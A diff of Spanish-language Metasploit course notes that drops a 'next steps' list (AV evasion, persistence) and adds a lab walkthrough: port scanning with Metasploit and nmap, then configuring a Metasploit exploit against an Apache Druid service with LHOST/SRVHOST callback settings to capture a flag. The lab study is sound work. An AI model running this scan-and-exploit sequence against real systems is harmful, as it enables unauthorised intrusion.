@@ -1139,15 +1139,6 @@ msf6 exploit(...) > show options
 
 ---
 
-## 🎯 Próximos Pasos
-
-> A continuación, veremos **Encoders** y cómo pueden ser usados para influenciar el resultado del ataque.
-
-**Temas siguientes**:
-- Encoders (evasión de AV)
-- msfvenom (generación de payloads)
-- Post-explotación avanzada
-- Persistencia
 
 ---
 
@@ -1163,6 +1154,65 @@ msf6 exploit(...) > show options
 
 ---
 
-**¡Ahora tienes un entendimiento completo de los Payloads en Metasploit!** 🚀
+---
 
-En la próxima sección, aprenderemos cómo **ofuscar y encodear** estos payloads para evadir detección.
+# Preguntas
+
+#### Explota el servicio Apache Druid y encuentra el archivo `flag.txt`. Envía el contenido de este archivo como respuesta.
+
+`Pista`: En MSF podemos buscar varias palabras.
+
+---
+
+Enviamos una traza `ICMP` de reconocimiento del host:
+
+<img width="934" height="283" alt="image" src="https://github.com/user-attachments/assets/6d32feb1-5344-493d-8cbd-04409aa11973" />
+
+Buscamos el escaner de puertos mediante el comando:
+```bash
+search type:auxiliary portscan
+```
+
+Y usamos `scanner/portscan/tcp` y escaneamos puertos 80, 443 y 8080:
+
+<img width="1887" height="666" alt="image" src="https://github.com/user-attachments/assets/dc7f2748-c8b9-40af-8446-a2d15c6ff9ff" />
+
+Volvemos a configurar los puertos del 1 al 10000 y escaneamos:
+<img width="898" height="310" alt="image" src="https://github.com/user-attachments/assets/5bc8f6b9-d0b7-40a4-b560-b930770c6cf5" />
+
+
+Confirmamos con nmap:
+```bash
+nmap -Pn -n --reason --disable-arp-ping -sS <ip>
+```
+
+<img width="964" height="333" alt="image" src="https://github.com/user-attachments/assets/3e5bf168-64a9-4e53-90ab-eb91c7f3e168" />
+
+Escaneamos versiones con nmap y utilizamos scripts NSE predefinidos, sumamos los puertos encontrados por metasploit:
+<img width="1360" height="831" alt="image" src="https://github.com/user-attachments/assets/e7c2ec52-6c22-4350-9d3c-faa66007d87a" />
+
+Tenemos los puertos 8081 y 8888 que dicen "Apache Druid" en su title.
+
+Buscamos en metasploit `Apache Druid`:
+<img width="1823" height="515" alt="image" src="https://github.com/user-attachments/assets/8a748448-5c23-4efa-997e-98e5bc140fa6" />
+
+
+Como sabemos que el sistema operativo es Ubuntu linux, elegimos el explot n° 0. Cuando ejecutamos `show options` vemos que está ya predefinido `RPORT 8888`.
+
+Hay que configurar:
+
+```bash
+set RHOST <target ip>
+set SRVHOST <mi_ip>
+set LHOST <mi_ip>
+```
+
+<img width="1442" height="341" alt="image" src="https://github.com/user-attachments/assets/82ea6ea8-f0f3-4fad-8ae8-c942563be461" />
+
+Buscamos la flag:
+<img width="933" height="201" alt="image" src="https://github.com/user-attachments/assets/3a177f4b-f24a-4121-9a60-8e85993299b6" />
+
+Leemos el archivo:
+<img width="536" height="65" alt="image" src="https://github.com/user-attachments/assets/cec727f7-b74d-44b4-9bec-6702e59d9a0c" />
+
+
